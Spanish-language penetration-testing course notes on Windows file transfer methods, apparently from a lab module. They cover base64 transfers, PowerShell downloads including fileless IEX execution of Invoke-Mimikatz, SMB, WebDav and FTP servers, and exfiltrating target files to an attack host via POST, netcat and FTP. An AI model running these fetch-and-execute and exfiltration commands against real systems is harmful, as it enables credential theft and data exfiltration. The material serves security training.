# Windows File Transfer Methods

## Introducción

El sistema operativo Windows ha evolucionado en los últimos años, y las nuevas versiones incluyen diferentes utilidades para las operaciones de transferencia de archivos. Comprender cómo funciona la transferencia de archivos en Windows puede ser útil tanto para atacantes como para defensores. Los atacantes pueden utilizar varios métodos de transferencia de archivos para operar y evitar ser detectados. Por otro lado, los defensores pueden aprender cómo funcionan estos métodos para monitorearlos y crear las políticas correspondientes que eviten comprometer su seguridad. Utilicemos como ejemplo el artículo del blog de Microsoft sobre el ataque Astaroth, el cual representa una amenaza persistente avanzada (APT).

El artículo comienza hablando de amenazas sin archivos. El término "sin archivos" sugiere que una amenaza no viene en un archivo, sino que utiliza herramientas legítimas incorporadas en el sistema para ejecutar un ataque. Esto no significa que no haya una operación de transferencia de archivos. Como se discutirá más adelante en esta sección, el archivo no está "presente" en el sistema, sino que se ejecuta en memoria.

El ataque Astaroth generalmente siguió estos pasos: un enlace malicioso en un correo electrónico de spear-phishing condujo a un archivo LNK. Al hacer doble clic, el archivo LNK provocó la ejecución de la herramienta WMIC con el parámetro "/Format", lo que permitió la descarga y ejecución de código JavaScript malicioso. Este código JavaScript, a su vez, descargó cargas útiles abusando de la herramienta Bitsadmin.

Todas las cargas útiles estaban codificadas en base64 y fueron decodificadas utilizando la herramienta Certutil, lo que resultó en la creación de varios archivos DLL. La herramienta _regsvr32_ se utilizó para cargar uno de los DLL decodificados, que luego descifró y cargó otros archivos hasta que finalmente el payload Astaroth fue inyectado en el proceso _Userinit_. A continuación se muestra una representación gráfica del ataque.

<figure><img src="../../.gitbook/assets/image (698).png" alt=""><figcaption></figcaption></figure>

Este es un excelente ejemplo de múltiples métodos de transferencia de archivos y de cómo los actores maliciosos utilizan esos métodos para evadir las defensas.

## Operaciones de descarga

En esta sección, se hablará del uso de algunas herramientas nativas de Windows para realizar operaciones de descarga y subida de archivos. Más adelante, en este módulo, discutiremos los binarios "Living Off The Land" en Windows y Linux, y cómo usarlos para realizar operaciones de transferencia de archivos.

Tenemos acceso a la máquina MS02, y necesitamos descargar un archivo desde nuestra máquina Pwnbox. Veamos cómo podemos lograr esto utilizando múltiples métodos de descarga de archivos.

<figure><img src="../../.gitbook/assets/image (699).png" alt=""><figcaption></figcaption></figure>

### Codificación y Decodificación Base64 en PowerShell

Dependiendo del tamaño del archivo que queramos transferir, podemos usar diferentes métodos que no requieren comunicación en red. Si tenemos acceso a una terminal, podemos codificar un archivo en una cadena base64, copiar su contenido desde la terminal y realizar la operación inversa, decodificando el archivo para restaurar el contenido original. Veamos cómo hacer esto con PowerShell.

Un paso esencial en este método es asegurarse de que el archivo codificado y decodificado sea correcto. Podemos usar _md5sum_, un programa que calcula y verifica checksums MD5 de 128 bits. La función hash MD5 actúa como una huella digital compacta de un archivo, lo que significa que un archivo debe tener el mismo hash MD5 en todas partes. Intentemos transferir una clave SSH de ejemplo, que puede ser cualquier otro archivo, desde nuestra máquina Pwnbox al objetivo Windows.

### Verificar el Hash MD5 de la clave SSH en Pwnbox

```bash
sherlock28@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

### Codificar la clave SSH a Base64 en Pwnbox

```bash
sherlock28@htb[/htb]$ cat id_rsa | base64 -w 0; echo
```

```plaintext
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQU...
```

Podemos copiar este contenido y pegarlo en una terminal de PowerShell en Windows, usando algunas funciones de PowerShell para decodificarlo.

#### Decodificar en PowerShell

```powershell
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<Cadena base64>"))
```

### Confirmar que los Hashes MD5 coincidan

```powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

> **Nota**: Este método es conveniente, pero tiene limitaciones, como la longitud máxima de cadena en la línea de comandos de Windows (8,191 caracteres). Además, shells web pueden fallar si se intentan enviar cadenas extremadamente grandes.

## Descargas Web en PowerShell

La mayoría de las empresas permiten tráfico HTTP y HTTPS saliente a través del firewall para la productividad de los empleados. Aprovechar estos métodos de transporte para transferencias de archivos es conveniente, aunque los defensores pueden usar soluciones de filtrado web para evitar el acceso a ciertas categorías de sitios web o bloquear la descarga de tipos de archivos específicos.

PowerShell ofrece varias opciones para la transferencia de archivos. En cualquier versión de PowerShell, la clase `System.Net.WebClient` puede usarse para descargar un archivo mediante HTTP, HTTPS o FTP. Aquí está la tabla con los métodos de _WebClient_ para descargar datos:

| Método                | Descripción                                                         |
| --------------------- | ------------------------------------------------------------------- |
| `OpenRead`            | Devuelve los datos de un recurso como un Stream.                    |
| `OpenReadAsync`       | Devuelve los datos de un recurso sin bloquear el hilo que lo llama. |
| `DownloadData`        | Descarga datos de un recurso y los devuelve como un array de Bytes. |
| `DownloadDataAsync`   | Descarga datos sin bloquear el hilo que lo llama.                   |
| `DownloadFile`        | Descarga datos a un archivo local.                                  |
| `DownloadFileAsync`   | Descarga datos a un archivo local sin bloquear el hilo.             |
| `DownloadString`      | Descarga una cadena de un recurso y la devuelve.                    |
| `DownloadStringAsync` | Descarga una cadena sin bloquear el hilo.                           |

Exploremos algunos ejemplos de estos métodos para descargar archivos usando PowerShell.

### Método DownloadFile de PowerShell

Podemos usar `Net.WebClient` y el método `DownloadFile` con los parámetros correspondientes a la URL del archivo a descargar y el nombre de salida.

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('<URL del archivo>', '<Nombre del archivo de salida>')
```

#### Ejemplo

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerView.ps1')
```

### Método DownloadString - Método Sin Archivos

En ataques sin archivos, en lugar de descargar un script de PowerShell al disco, podemos ejecutarlo directamente en memoria usando `Invoke-Expression` o el alias `IEX`.

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('<URL del script>')
```

#### Ejemplo

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

### PowerShell Invoke-WebRequest

Desde PowerShell 3.0, el cmdlet `Invoke-WebRequest` también está disponible, aunque es notablemente más lento para descargar archivos. Se puede usar con alias como `iwr`, `curl` o `wget`.

```powershell
PS C:\htb> Invoke-WebRequest '<URL del archivo>' -OutFile '<Nombre del archivo de salida>'
```

#### Ejemplo

```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

## Errores comunes en PowerShell

<figure><img src="../../.gitbook/assets/image (700).png" alt=""><figcaption></figcaption></figure>

### **Error de Parsing de Internet Explorer**

```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
```

Si el motor de Internet Explorer no está disponible o la configuración inicial no se ha completado, podemos agregar el parámetro `-UseBasicParsing`.

```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

**Error de Canal Seguro SSL/TLS**

Si el certificado no es confiable, podemos evitar el error con el siguiente comando:

```powershell
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValid
```

## Descargas SMB

El protocolo **Server Message Block (SMB)**, que opera en el puerto **TCP/445**, es común en redes empresariales donde se ejecutan servicios de Windows. Este protocolo permite a las aplicaciones y usuarios transferir archivos hacia y desde servidores remotos.

Podemos usar SMB para descargar archivos fácilmente desde nuestro Pwnbox. Para ello, necesitamos crear un servidor SMB en Pwnbox con **smbserver.py** de **Impacket**, y luego utilizar comandos como `copy`, `move`, `PowerShell Copy-Item`, u otra herramienta que permita la conexión a SMB.

### Crear el Servidor SMB

```bash
sherlock28@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

### Copiar un Archivo desde el Servidor SMB

Para descargar un archivo del servidor SMB al directorio de trabajo actual, podemos usar el siguiente comando:

```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe
        1 file(s) copied.
```

Las versiones más recientes de Windows bloquean el acceso de invitados no autenticados, como podemos ver en el siguiente mensaje de error:

```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

### Crear el Servidor SMB con un Usuario y Contraseña

Para transferir archivos en este escenario, podemos establecer un nombre de usuario y contraseña usando nuestro servidor SMB de Impacket y montar el servidor SMB en la máquina Windows objetivo:

```bash
sherlock28@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

### Montar el Servidor SMB con Usuario y Contraseña

```cmd
C:\htb> net use n: \\192.168.220.133\share /user:test test
The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

> **Nota:** También puedes montar el servidor SMB si recibes un error al usar el comando `copy filename \\IP\sharename`.

## Descargas FTP

Otra forma de transferir archivos es utilizando **FTP (File Transfer Protocol)**, que utiliza los puertos **TCP/21** y **TCP/20**. Podemos usar el cliente FTP o **PowerShell Net.WebClient** para descargar archivos desde un servidor FTP.

Podemos configurar un servidor FTP en nuestro host de ataque utilizando el módulo **pyftpdlib** de Python3. Se puede instalar con el siguiente comando:

### Instalando el Módulo del Servidor FTP en Python3 - pyftpdlib

```bash
sherlock28@htb[/htb]$ sudo pip3 install pyftpdlib
```

Luego podemos especificar el número de puerto 21, ya que por defecto **pyftpdlib** utiliza el puerto 2121. La autenticación anónima está habilitada por defecto si no establecemos un usuario y contraseña.

### Configurando un Servidor FTP con Python3

```bash
sherlock28@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```

Una vez configurado el servidor FTP, podemos realizar transferencias de archivos utilizando el cliente FTP preinstalado en Windows o **PowerShell Net.WebClient**.

### Transferir Archivos desde un Servidor FTP Usando PowerShell

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Cuando obtenemos una shell en una máquina remota, puede que no tengamos una shell interactiva. En ese caso, podemos crear un archivo de comandos FTP para descargar un archivo. Primero, necesitamos crear un archivo que contenga los comandos que queremos ejecutar y luego usar el cliente FTP para ejecutar esos comandos y descargar el archivo.

### Crear un Archivo de Comandos para el Cliente FTP y Descargar el Archivo Objetivo

```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb> more file.txt
This is a test file
```

## Operaciones de Subida

También hay situaciones, como el crackeo de contraseñas, análisis, exfiltración, etc., en las que necesitamos subir archivos desde nuestra máquina objetivo a nuestro host de ataque. Podemos utilizar los mismos métodos que empleamos para la descarga, pero esta vez para subir archivos.

## Codificación y Decodificación Base64 en PowerShell

Vimos cómo decodificar una cadena base64 utilizando PowerShell. Ahora, vamos a realizar la operación inversa: codificar un archivo para poder decodificarlo en nuestro host de ataque.

### Codificar un Archivo Usando PowerShell

```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

```plaintext
IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiM...
```

Para verificar la integridad del archivo, podemos calcular su hash MD5:

```powershell
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

```plaintext
----
3688374325B992DEF12793500307566D
```

### Decodificar una Cadena Base64 en Linux

En el host de ataque, copiamos la salida de PowerShell y utilizamos el comando `base64` para decodificarla y recuperar el archivo.

```bash
sherlock28@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiM... | base64 -d > hosts
```

Para confirmar que el archivo se transfirió correctamente, calculamos su hash MD5 en Linux:

```bash
sherlock28@htb[/htb]$ md5sum hosts
```

```plaintext
3688374325b992def12793500307566d  hosts
```

## Subidas Web con PowerShell

PowerShell no tiene una función incorporada para operaciones de subida de archivos, pero podemos utilizar los cmdlets **Invoke-WebRequest** o **Invoke-RestMethod** para construir una función de subida. También necesitaremos un servidor web que acepte subidas de archivos.

Para nuestro servidor web, podemos usar **uploadserver**, un módulo extendido de **Python HTTP.server** que incluye una página para subir archivos. A continuación, lo instalamos y arrancamos el servidor web.

### Instalar un Servidor Web Configurado para Subidas

```bash
sherlock28@htb[/htb]$ pip3 install uploadserver
```

```plaintext
Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Luego, iniciamos el servidor:

```bash
sherlock28@htb[/htb]$ python3 -m uploadserver
```

```plaintext
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Script de PowerShell para Subir un Archivo al Servidor de Subida en Python

Usamos el script **PSUpload.ps1** para realizar la operación de subida de archivos. Este script acepta dos parámetros: `-File`, para especificar la ruta del archivo, y `-Uri`, para la URL del servidor donde subiremos el archivo.

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

```plaintext
[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

### Subida Web con Base64 en PowerShell

Otra forma de utilizar PowerShell y archivos codificados en base64 para subir archivos es mediante **Invoke-WebRequest** o **Invoke-RestMethod** junto con **Netcat**. Utilizamos Netcat para escuchar en un puerto especificado y enviar el archivo como una solicitud POST.

Codificamos el archivo en base64 y lo enviamos:

```powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

En el host de ataque, capturamos los datos base64 con **Netcat**:

```bash
sherlock28@htb[/htb]$ nc -lvnp 8000
```

Finalmente, decodificamos la cadena base64 para recuperar el archivo original:

```bash
sherlock28@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

## Cargas SMB

Las empresas suelen permitir el tráfico saliente utilizando los protocolos HTTP (TCP/80) y HTTPS (TCP/443), pero generalmente no permiten el protocolo SMB (TCP/445) fuera de su red interna debido a posibles ataques. Sin embargo, podemos usar **SMB sobre HTTP** con **WebDav**, que es una extensión de HTTP. WebDav permite que un servidor web actúe como un servidor de archivos, lo que permite la creación colaborativa de contenido y puede usar tanto HTTP como HTTPS.

Cuando utilizas SMB, primero intenta conectarse mediante el protocolo SMB, y si no encuentra un recurso compartido SMB, intentará conectarse mediante HTTP.

<figure><img src="../../.gitbook/assets/image (701).png" alt=""><figcaption></figcaption></figure>

### **Configuración del Servidor WebDav**

Para configurar un servidor WebDav, necesitamos instalar dos módulos de Python: **wsgidav** y **cheroot**. Luego ejecutamos la aplicación **wsgidav** en el directorio objetivo.

### **Instalando los módulos de Python WebDav**

```bash
sherlock28@htb[/htb]$ sudo pip3 install wsgidav cheroot
```

### **Usando el módulo de Python WebDav**

```bash
sherlock28@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

El comando anterior ejecutará el servidor WebDav en el puerto 80 con acceso anónimo al directorio `/tmp`.

### **Conectando al recurso compartido WebDav**

En el host de Windows, podemos conectarnos al recurso compartido usando la palabra clave `DavWWWRoot`, que es reconocida por Windows Shell para indicar que te conectas a la raíz de un servidor WebDav.

```powershell
C:\htb> dir \\192.168.49.128\DavWWWRoot
```

Este comando mostrará el contenido del recurso compartido en el servidor WebDav.

### **Subiendo Archivos usando SMB**

Para subir archivos al recurso compartido WebDav desde un host Windows, podemos usar el comando `copy`:

```powershell
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

O también podemos especificar un directorio específico en el servidor:

```powershell
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

## **Cargas FTP**

También es posible subir archivos usando FTP de manera similar a cómo se descargan archivos. Antes de empezar, podemos usar el módulo de Python **pyftpdlib** para iniciar un servidor FTP con permisos de escritura.

**Iniciando el servidor FTP**

```bash
sherlock28@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
```

Esto inicia un servidor FTP en el puerto 21 que permite cargas anónimas.

**Subiendo Archivos con PowerShell a un Servidor FTP**

Luego, desde un host de Windows, podemos usar una función de PowerShell para subir un archivo al servidor FTP.

### Cargar Archivos con PowerShell

Podemos subir un archivo usando PowerShell con el siguiente comando:

```powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

### Crear un Archivo de Comandos para el Cliente FTP y Subir un Archivo

Podemos crear un archivo de comandos para que el cliente FTP ejecute la carga del archivo de manera automatizada.

```cmd
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
```

Este archivo de comandos ejecuta los siguientes pasos:

1. Se conecta al servidor FTP (`open 192.168.49.128`).
2. Inicia sesión con el usuario `anonymous`.
3. Cambia al modo binario.
4. Sube el archivo `hosts` desde `C:\Windows\System32\drivers\etc\hosts`.
5. Cierra la conexión.

#### Pasos ejecutados en el cliente FTP

```bash
ftp> open 192.168.49.128
ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```
